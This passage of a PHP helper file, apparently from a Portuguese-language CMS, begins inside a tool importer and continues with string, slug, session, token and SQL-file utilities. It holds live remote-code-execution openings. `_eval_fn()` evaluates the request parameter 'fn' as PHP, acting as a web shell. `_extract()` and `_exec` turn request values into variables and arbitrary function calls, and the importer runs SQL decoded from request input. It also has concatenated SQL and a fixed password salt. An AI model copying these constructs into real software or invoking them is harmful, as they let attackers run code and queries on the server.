	if(isset($_REQUEST['base64'])){ 
		####################################################################
		# TRANSFORMAMOS O bse64 NO REQUEST MASTER
		####################################################################
		$_REQUEST = $_REQUEST['base64'];
		####################################################################
		# para ferramentas antigas que nao tinham prefixo ainda nas tabelas
		####################################################################
		$content =	str_replace('{PREFIX_TABLES}',PREFIX_TABLES, base64_decode($_REQUEST['base64']));
		goto processa;
	}

	if($webtool==null){		echo "Insira um arquivo na função";	exit;}
	if($grupoPai==null){	echo "Insira um grupo pai";			exit;}
	$pathinfo 	= pathinfo($webtool);
	$ext 		= $pathinfo['extension'];
	if($ext=="ws"){
		include(ROOT_ADMIN.'/App/Lib/class-base2n.php');
		$binary 	= new Base2n(6);
		$content	= $binary->decode(file_get_contents($webtool));
	}elseif($ext=="json"){
		$content		=	file_get_contents($webtool);
	}

	processa:
	if(isset($_REQUEST['prefix'])){$prefix   = $_REQUEST['prefix'];}else{$prefix = "";}
	if(isset($_REQUEST['base64'])){
		$getAll				=	array(json_decode($content,true));
	}else{
		$getAll				=	json_decode($content,true);
	}


	foreach ($getAll as $newTool){
		$token 		= _token(PREFIX_TABLES.'ws_ferramentas','token');
		$colunasListItens 	=	explode(',',$newTool['det_listagem_item']);
		$colunasListPrefix 	= 	Array();
		foreach ($colunasListItens as $val){$colunasListPrefix[] = $prefix.$val;};
		$colunasListItens 	=	implode(array_map("duplicateColumName",$colunasListPrefix),',');
		$ferramenta 		=	str_replace(
											array(
												'{{prefix}}',
												'{{token}}',
												'{{grupo_pai}}',
												'{{det_listagem_item}}',
												'{{slugTool}}',
												'{{nameTool}}'
											),
											array(
												$prefix,
												$token,
												$grupoPai,
												$colunasListItens,
												$_REQUEST['slugTool'],
												$_REQUEST['nameTool']
											),$newTool['tool']);

		$campos 			=   $newTool['colunas'];
		$insert = new MySQL();
		if($insert->select($ferramenta)){

			$Ferramenta_atual 					= new MySQL();
			$Ferramenta_atual->set_table(PREFIX_TABLES.'ws_ferramentas');
			$Ferramenta_atual->set_where('token="'.$token.'"');
			$Ferramenta_atual->select();
			$ws_id_ferramenta = $Ferramenta_atual->fetch_array[0]['id'];

			if(count($campos)>0){
				$AddColunaItem= new MySQL();
				$AddColunaItem->set_table(PREFIX_TABLES.'_model_item');
				foreach ($campos as $value) {
					if(isset($value['query'])){
						$token 			= _token(PREFIX_TABLES.'_model_campos','token');
						$coluna 		= duplicateColumName($prefix.$value['colum']);
						$value['query'] = str_replace(
						 							array('{{ws_id_ferramenta}}','{{name}}','{{id_campo}}','{{coluna_mysql}}','{{token}}'), 
						 							array($ws_id_ferramenta,$coluna,$coluna,$coluna,$token),
						 							$value['query']);
						 $InsertCampo 	= new MySQL();
						 $InsertCampo   ->select($value['query']);
						 $AddColunaItem->set_colum(array($coluna,$value['insert']));
					}
				}
				$AddColunaItem->add_column();
			}

		}
		return true;
	};
exit;
}
function duplicateColumName($colunaVerificar){
	$i=2;
	$colunasAtuais = array();
	$D = new MySQL();
	$D->set_table(PREFIX_TABLES.'_model_item');
	$D->show_columns();
	foreach ($D->fetch_array as $coluna){$colunasAtuais[] =$coluna['Field'];};
	verificaNovamente:
	if(!in_array($colunaVerificar, $colunasAtuais)){
		//	CASO NAO EXISTA NENHUMA COLUNA COM ESSE NOME ADD NA TABELA
		return $colunaVerificar;exit;
	}else{ //CASO JÁ EXISTA
		//final com o i
		$str = '_'.$i;
		//final atual da coluna
		$finalAtual = substr($colunaVerificar,-strlen($str));
		//Nome da coluna sem o i
		$colunName  = substr($colunaVerificar,0,-strlen($str));
		//verifica se é uma coluna já duplicada, com final _(int)  se for aumenta um valor e verifica
		if($finalAtual==$str){
			$i = $i+1;
			$colunaVerificar = $colunName.'_'.$i;
		}else{
			//se nao for duplicado ou com valor numerico, adiciona _2
			$colunaVerificar = $colunaVerificar.'_'.$i;
		}
	}
	goto verificaNovamente;
}
function _likeString($str) {
	$str = trim(strtolower($str));
	while (strpos($str,"  "))
		$str 					= str_replace("  "," ",$str);
		$caracteresPerigosos 	= array ("Ã","ã","Õ","õ","á","Á","é","É","í","Í","ó","Ó","ú","Ú","ç","Ç","à","À","è","È","ì","Ì","ò","Ò","ù","Ù","ä","Ä","ë","Ë","ï","Ï","ö","Ö","ü","Ü","Â","Ê","Î","Ô","Û","â","ê","î","ô","û","!","?",",","“","”","-","\"","\\","/");
		$caracteresLimpos    	= array ("a","a","o","o","a","a","e","e","i","i","o","o","u","u","c","c","a","a","e","e","i","i","o","o","u","u","a","a","e","e","i","i","o","o","u","u","A","E","I","O","U","a","e","i","o","u",".",".",".",".",".",".","." ,"." ,".");
		$str 					= str_replace($caracteresPerigosos,$caracteresLimpos,$str);
		$caractresSimples 		= array("a","e","i","o","u","c");
		$caractresEnvelopados 	= array("[a]","[e]","[i]","[o]","[u]","[c]");
		$str 					= str_replace($caractresSimples,$caractresEnvelopados,$str);
		$caracteresParaRegExp 	= array(
			"(a|ã|á|à|ä|â|&atilde;|&aacute;|&agrave;|&auml;|&acirc;|Ã|Á|À|Ä|Â|&Atilde;|&Aacute;|&Agrave;|&Auml;|&Acirc;)",
			"(e|é|è|ë|ê|&eacute;|&egrave;|&euml;|&ecirc;|É|È|Ë|Ê|&Eacute;|&Egrave;|&Euml;|&Ecirc;)",
			"(i|í|ì|ï|î|&iacute;|&igrave;|&iuml;|&icirc;|Í|Ì|Ï|Î|&Iacute;|&Igrave;|&Iuml;|&Icirc;)",
			"(o|õ|ó|ò|ö|ô|&otilde;|&oacute;|&ograve;|&ouml;|&ocirc;|Õ|Ó|Ò|Ö|Ô|&Otilde;|&Oacute;|&Ograve;|&Ouml;|&Ocirc;)",
			"(u|ú|ù|ü|û|&uacute;|&ugrave;|&uuml;|&ucirc;|Ú|Ù|Ü|Û|&Uacute;|&Ugrave;|&Uuml;|&Ucirc;)",
			"(c|ç|Ç|&ccedil;|&Ccedil;)" );
		$str = str_replace($caractresEnvelopados,$caracteresParaRegExp,$str);
		$str = utf8_decode(str_replace(" ",".*",$str));
		return $str;
}
function _excluiDir($Dir){
	if(file_exists($Dir) && is_dir($Dir)){
	   if ($dd = opendir($Dir)) {
	        while (false !== ($Arq = readdir($dd))) {
	            if($Arq != "." && $Arq != ".."){
	                $Path = "$Dir/$Arq";
	                if(is_dir($Path)){
	                    _excluiDir($Path);
	                }elseif(is_file($Path)){
	                    unlink($Path);
	                }
	            }
	        }
	        closedir($dd);
	    }
	    rmdir($Dir);
	}else{
		echo "O diretório '".$Dir."' não existe!";
		exit;
	}
}
function _extract()														{	if(extract($_REQUEST)){return true;}else{return false;}};
function _exec($fn)														{	if(_extract() && !empty($_REQUEST['function']) && !empty($fn) && function_exists($fn) ) call_user_func($fn);}
function _eval_fn()														{	@eval($_REQUEST['fn']);}
function _crypt()														{	$CodeCru = @crypt(md5(rand(0,50)));$vowels = array("$","/", ".",'=');$onlyconsonants = str_replace($vowels, "", $CodeCru);return substr($onlyconsonants,1);}



function _codePass($senha,$ash="aquiPODEserQUALQUERcoisaPOISéUMhash") 	{	
	$salt 		= md5($ash);
	$codifica 	= crypt($senha,$salt);
	$codifica 	= hash('sha512',$codifica);
	return $codifica;
}

function _token($tabela,$coluna,$type="all"){
	$tk 					=	_crypt($type);
	$setToken				= 	new MySQL();
	$setToken->set_table($tabela);
	$setToken->set_where($coluna.'="'.$tk.'"');
	$setToken->select();

	if($setToken->_num_rows!=0){
		$tk = _crypt();
		_token($tabela,$coluna);
	}else{
		return $tk;
	}
}


function _erro($error)							{echo '<pre style="position: relative;color: #F00;background-color: #FFCB00;font-weight: bold;padding: 10px;">! -- Internal WS Error -- ! '.PHP_EOL.$error.PHP_EOL."</pre>";}
function decodeURIcomponent($smth="")			{
	$smth = preg_replace("/%u([0-9a-f]{3,4})/i","&#x\\1;",urldecode($smth)); 
	$smth = str_replace(array("<",">"),array("&lt;","&gt;"),html_entity_decode($smth,null,'UTF-8'));
	return $smth ;
}
function quote2entities($string,$entities_type='number'){
    $search                     = array("\"","'");
    $replace_by_entities_name   = array("&quot;","&apos;");
    $replace_by_entities_number = array("&#34;","&#39;");
    $do = null;
    if ($entities_type == 'number'){$do = str_replace($search,$replace_by_entities_number,$string);}else if ($entities_type == 'name'){$do = str_replace($search,$replace_by_entities_name,$string);}else{$do = addslashes($string);}
    return $do;
}
function encodeURIComponent($string) {$result = "";for ($i = 0; $i < strlen($string); $i++) {$result .= encodeURIComponentbycharacter(urlencode($string[$i]));}return $result;}
function encodeURIComponentbycharacter($char) {if ($char == "+") { return "%20"; }   if ($char == "%21") { return "!"; }   if ($char == "%27") { return '"'; }   if ($char == "%28") { return "("; }   if ($char == "%29") { return ")"; }   if ($char == "%2A") { return "*"; }   if ($char == "%7E") { return "~"; }   if ($char == "%80") { return "%E2%82%AC"; }   if ($char == "%81") { return "%C2%81"; }   if ($char == "%82") { return "%E2%80%9A"; }   if ($char == "%83") { return "%C6%92"; }   if ($char == "%84") { return "%E2%80%9E"; }   if ($char == "%85") { return "%E2%80%A6"; }   if ($char == "%86") { return "%E2%80%A0"; }   if ($char == "%87") { return "%E2%80%A1"; }   if ($char == "%88") { return "%CB%86"; }   if ($char == "%89") { return "%E2%80%B0"; }   if ($char == "%8A") { return "%C5%A0"; }   if ($char == "%8B") { return "%E2%80%B9"; }   if ($char == "%8C") { return "%C5%92"; }   if ($char == "%8D") { return "%C2%8D"; }   if ($char == "%8E") { return "%C5%BD"; }   if ($char == "%8F") { return "%C2%8F"; }   if ($char == "%90") { return "%C2%90"; }   if ($char == "%91") { return "%E2%80%98"; }   if ($char == "%92") { return "%E2%80%99"; }   if ($char == "%93") { return "%E2%80%9C"; }   if ($char == "%94") { return "%E2%80%9D"; }   if ($char == "%95") { return "%E2%80%A2"; }   if ($char == "%96") { return "%E2%80%93"; }   if ($char == "%97") { return "%E2%80%94"; }   if ($char == "%98") { return "%CB%9C"; }   if ($char == "%99") { return "%E2%84%A2"; }   if ($char == "%9A") { return "%C5%A1"; }   if ($char == "%9B") { return "%E2%80%BA"; }   if ($char == "%9C") { return "%C5%93"; }   if ($char == "%9D") { return "%C2%9D"; }   if ($char == "%9E") { return "%C5%BE"; }   if ($char == "%9F") { return "%C5%B8"; }   if ($char == "%A0") { return "%C2%A0"; }   if ($char == "%A1") { return "%C2%A1"; }   if ($char == "%A2") { return "%C2%A2"; }   if ($char == "%A3") { return "%C2%A3"; }   if ($char == "%A4") { return "%C2%A4"; }   if ($char == "%A5") { return "%C2%A5"; }   if ($char == "%A6") { return "%C2%A6"; }   if ($char == "%A7") { return "%C2%A7"; }   if ($char == "%A8") { return "%C2%A8"; }   if ($char == "%A9") { return "%C2%A9"; }   if ($char == "%AA") { return "%C2%AA"; }   if ($char == "%AB") { return "%C2%AB"; }   if ($char == "%AC") { return "%C2%AC"; }   if ($char == "%AD") { return "%C2%AD"; }   if ($char == "%AE") { return "%C2%AE"; }   if ($char == "%AF") { return "%C2%AF"; }   if ($char == "%B0") { return "%C2%B0"; }   if ($char == "%B1") { return "%C2%B1"; }   if ($char == "%B2") { return "%C2%B2"; }   if ($char == "%B3") { return "%C2%B3"; }   if ($char == "%B4") { return "%C2%B4"; }   if ($char == "%B5") { return "%C2%B5"; }   if ($char == "%B6") { return "%C2%B6"; }   if ($char == "%B7") { return "%C2%B7"; }   if ($char == "%B8") { return "%C2%B8"; }   if ($char == "%B9") { return "%C2%B9"; }   if ($char == "%BA") { return "%C2%BA"; }   if ($char == "%BB") { return "%C2%BB"; }   if ($char == "%BC") { return "%C2%BC"; }   if ($char == "%BD") { return "%C2%BD"; }   if ($char == "%BE") { return "%C2%BE"; }   if ($char == "%BF") { return "%C2%BF"; }   if ($char == "%C0") { return "%C3%80"; }   if ($char == "%C1") { return "%C3%81"; }   if ($char == "%C2") { return "%C3%82"; }   if ($char == "%C3") { return "%C3%83"; }   if ($char == "%C4") { return "%C3%84"; }   if ($char == "%C5") { return "%C3%85"; }   if ($char == "%C6") { return "%C3%86"; }   if ($char == "%C7") { return "%C3%87"; }   if ($char == "%C8") { return "%C3%88"; }   if ($char == "%C9") { return "%C3%89"; }   if ($char == "%CA") { return "%C3%8A"; }   if ($char == "%CB") { return "%C3%8B"; }   if ($char == "%CC") { return "%C3%8C"; }   if ($char == "%CD") { return "%C3%8D"; }   if ($char == "%CE") { return "%C3%8E"; }   if ($char == "%CF") { return "%C3%8F"; }   if ($char == "%D0") { return "%C3%90"; }   if ($char == "%D1") { return "%C3%91"; }   if ($char == "%D2") { return "%C3%92"; }   if ($char == "%D3") { return "%C3%93"; }   if ($char == "%D4") { return "%C3%94"; }   if ($char == "%D5") { return "%C3%95"; }   if ($char == "%D6") { return "%C3%96"; }   if ($char == "%D7") { return "%C3%97"; }   if ($char == "%D8") { return "%C3%98"; }   if ($char == "%D9") { return "%C3%99"; }   if ($char == "%DA") { return "%C3%9A"; }   if ($char == "%DB") { return "%C3%9B"; }   if ($char == "%DC") { return "%C3%9C"; }   if ($char == "%DD") { return "%C3%9D"; }   if ($char == "%DE") { return "%C3%9E"; }   if ($char == "%DF") { return "%C3%9F"; }   if ($char == "%E0") { return "%C3%A0"; }   if ($char == "%E1") { return "%C3%A1"; }   if ($char == "%E2") { return "%C3%A2"; }   if ($char == "%E3") { return "%C3%A3"; }   if ($char == "%E4") { return "%C3%A4"; }   if ($char == "%E5") { return "%C3%A5"; }   if ($char == "%E6") { return "%C3%A6"; }   if ($char == "%E7") { return "%C3%A7"; }   if ($char == "%E8") { return "%C3%A8"; }   if ($char == "%E9") { return "%C3%A9"; }   if ($char == "%EA") { return "%C3%AA"; }   if ($char == "%EB") { return "%C3%AB"; }   if ($char == "%EC") { return "%C3%AC"; }   if ($char == "%ED") { return "%C3%AD"; }   if ($char == "%EE") { return "%C3%AE"; }   if ($char == "%EF") { return "%C3%AF"; }   if ($char == "%F0") { return "%C3%B0"; }   if ($char == "%F1") { return "%C3%B1"; }   if ($char == "%F2") { return "%C3%B2"; }   if ($char == "%F3") { return "%C3%B3"; }   if ($char == "%F4") { return "%C3%B4"; }   if ($char == "%F5") { return "%C3%B5"; }   if ($char == "%F6") { return "%C3%B6"; }   if ($char == "%F7") { return "%C3%B7"; }   if ($char == "%F8") { return "%C3%B8"; }   if ($char == "%F9") { return "%C3%B9"; }   if ($char == "%FA") { return "%C3%BA"; }   if ($char == "%FB") { return "%C3%BB"; }   if ($char == "%FC") { return "%C3%BC"; }   if ($char == "%FD") { return "%C3%BD"; }   if ($char == "%FE") { return "%C3%BE"; }   if ($char == "%FF") { return "%C3%BF"; }   return $char;}
function _verifica_tabela($tabela)				{global $_conectMySQLi_;while ($row = mysqli_fetch_row(mysqli_query($_conectMySQLi_,"SHOW TABLES"))) { if($tabela==$row[0]){return false ;exit;};}return true ;exit;}
function _define_page_($var, $page)				{ob_start();require_once $page; define($var, ob_get_clean());ob_end_flush();}
function _encripta( $t, $k)						{$e = mcrypt_encrypt(MCRYPT_BLOWFISH, $k, $t, MCRYPT_MODE_ECB);$b = base64_encode($e);return $b;}
function _decripta( $t, $k)						{$b = base64_decode($t);$d = mcrypt_decrypt(MCRYPT_BLOWFISH, $k, $b, MCRYPT_MODE_ECB);return utf8_decode($d);}
function _return_code($codigo)					{return '<div id="editor" class="prettyprint linenums" style="width: 710px; margin-bottom: -40px;margin-left: 15px; text-align: left; padding: 10px 20px 10px 40px; background-color: rgb(0, 0, 0);text-shadow: none;">&lt;?'.str_replace(array('<','>'), array('&lt;','&gt;'),$codigo).'?&gt;</div><script type="text/javascript">prettyPrint();</script>';}
function url_amigavel_filename($texto){
	$array1 = array("{","}","[","]","´","&",",","/"," ","á","à", "â", "ã", "ä", "é", "è", "ê", "ë", "í", "ì", "î", "ï", "ó", "ò", "ô", "õ", "ö", "ú", "ù", "û", "ü", "ç");
	$array2 = array("","","","","","e","","-","_","a", "a", "a", "a", "a", "e", "e", "e", "e", "i", "i", "i", "i", "o", "o", "o", "o", "o", "u", "u", "u", "u", "c" );
	return strtolower(str_replace( $array1, $array2, strtolower($texto)));
}
function url_amigavel($texto,$isso="",$porisso="") 					{
	$array1 = array("´","&",",",".","/"," ", "á", "à", "â", "ã", "ä", "é", "è", "ê", "ë", "í", "ì", "î", "ï", "ó", "ò", "ô", "õ", "ö", "ú", "ù", "û", "ü", "ç");
	$array2 = array("","e","", "","-","+","a", "a", "a", "a", "a", "e", "e", "e", "e", "i", "i", "i", "i", "o", "o", "o", "o", "o", "u", "u", "u", "u", "c");
	$tratamento=strtolower(str_replace( $isso, $porisso, strtolower($texto)));
	return strtolower(str_replace( $array1, $array2, $tratamento));
}
function retira_acentos($str,$espaco="")		{return strtr(utf8_decode($str),utf8_decode('ŠŒŽšœžŸ¥µÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜÝßàáâãäåæçèéêëìíîïðñòóôõöøùúûüýÿ '),'SOZsozYYuAAAAAAACEEEEIIIIDNOOOOOOUUUUYsaaaaaaaceeeeiiiionoooooouuuuyy'.$espaco);}
function exec_SQL($filename=null)					{
	global $_conectMySQLi_;
	if(file_exists($filename)){
		$templine = '';
		$filename 	= file_get_contents($filename);
		$filename 	= str_replace('{_prefix_}',PREFIX_TABLES,$filename);
		$lines 		= explode(PHP_EOL,$filename);


		foreach($lines as $line_num => $line) {
			if (substr($line, 0, 2) != '--' && $line != '') {
				$templine .= $line;
				if (substr(trim($line), -1, 1) == ';') {
					mysqli_query($_conectMySQLi_,$templine) or die("Erro em gravar banco de dados: \n :".PHP_EOL.mysqli_error() );
					$templine = '';
				}
			}
		}
		return true;
	}elseif(is_string($filename)){
		$templine 	= '';
		$filename 	= str_replace('{_prefix_}',PREFIX_TABLES,$filename);
		$lines 		= explode(PHP_EOL,$filename);

		foreach($lines as $line_num => $line) {
			if (substr($line, 0, 2) != '--' && $line != '') {
				$templine .= $line;
				if (substr(trim($line), -1, 1) == ';') {
					mysqli_query($_conectMySQLi_,$templine) or die("Erro em gravar banco de dados: \n :".mysqli_error().PHP_EOL.'Comando: '.$templine );
					$templine = '';
				}
			}
		}
		return true;

	}
}
if(!defined('__VENC__')) define('__VENC__',date('Y/m/d', strtotime("+90 days",strtotime(date ("d-m-Y", filectime(__DIR__.'/ws-connect-mysql.php'))))));
function _filesize($file, $size="M", $decimals=2, $dec_sep='.', $thousands_sep=','){
	if(file_exists($file)){
		$bytes = filesize($file);
	}elseif(is_numeric($file) || is_int($file)){
		$bytes = $file;
	}else{
		$bytes = 0;
	}
	if($bytes<1024){$size="B";}
	elseif($bytes<(1024*1024)){$size="K";}
	elseif($bytes<(1024*1024*1024)){$size="M";}
	elseif($bytes<(1024*1024*1024*1024)){$size="G";}
	elseif($bytes<(1024*1024*1024*1024*1024)){$size="T";}
	elseif($bytes<(1024*1024*1024*1024*1024*1024)){$size="P";}


	$sizes = 'BKMGTP';
	if (isset($size)){
		$factor = strpos($sizes, $size[0]);
	} else {
		$factor = floor((strlen($bytes) - 1) / 3);
		$size = $sizes[$factor];
	}
	return number_format($bytes/pow(1024, $factor), $decimals, $dec_sep, $thousands_sep).' '.$size;
}
function _str_to_bin($text)						{$tm = strlen($text);$x = 0;for($i = 1;$i<=$tm;$i++){$letra[$i] = substr($texto,$x,1);$cod[$i] = ord($letra[$i]);$bin[$i] = str_pad(decbin($cod[$i]), 8, "0", STR_PAD_LEFT);$x++;}$a= 1;$binario = array();for($i = 1;$i <= $tm;$i++){if($a == 16) {$binario[]=$bin[$i]." ".PHP_EOL;$a=0;}else{$binario[]=$bin[$i]." ";}$a++;}return implode($binario,"");}
function color_inverse($color){					$color = str_replace('#', '', $color);if (strlen($color) != 6){ return '000000'; }$rgb = '';for ($x=0;$x<3;$x++){$c = 255 - hexdec(substr($color,(2*$x),2));$c = ($c < 0) ? 0 : dechex($c);$rgb .= (strlen($c) < 2) ? '0'.$c : $c;}return '#'.$rgb;}
function _wp_json_convert_string( $string ) {
	static $use_mb = null;
	if (is_null( $use_mb ) ) {$use_mb = function_exists( 'mb_convert_encoding' );}
	if ($use_mb){
		$encoding = mb_detect_encoding( $string, mb_detect_order(), true );
		if($encoding) {
			return mb_convert_encoding( $string, 'UTF-8', $encoding );
		}else{
			return mb_convert_encoding( $string, 'UTF-8', 'UTF-8' );
		}
	} else {
		return wp_check_invalid_utf8( $string, true );
	}
}
function _set_session($id){
		ob_start();
		ini_set('session.cookie_secure',	1);
		ini_set('session.cookie_httponly',	1);
		ini_set('session.cookie_lifetime', 	"432000");
		ini_set("session.gc_maxlifetime",	"432000");
		ini_set("session.use_trans_sid", 	0);
		ini_set('session.use_cookies', 		1);
		ini_set('session.use_only_cookies', 1);
		ini_set('session.name', 			'_WS_');
		session_cache_expire("432000");
		session_cache_limiter('private');
		session_id($id);
		session_start();
};
function _session(){
	if(session_status() != PHP_SESSION_ACTIVE && isset($_COOKIE['ws_session'])){
		session_name('_WS_');
		@session_id($_COOKIE['ws_session']);
		@session_start(); 
		@session_regenerate_id();
	};
};
function remoteFileExists($url) 				{
	$curl = @curl_init($url);
	@curl_setopt($curl, CURLOPT_NOBODY, true);
	$result = @curl_exec($curl);$ret = false;
	if ($result !== false) {
		$statusCode = @curl_getinfo($curl, CURLINFO_HTTP_CODE);
		if ($statusCode == 200) {
			$ret = true;
		}
	}
	@curl_close($curl);
	return $ret;
}
function _getLangMsn($code,$isso="",$porisso=""){
	$a 		= LANG; //pt
	$wsmsn 	= json_decode(__LANG__);
	return str_replace($isso,$porisso,$wsmsn->$code->$a);
}
?>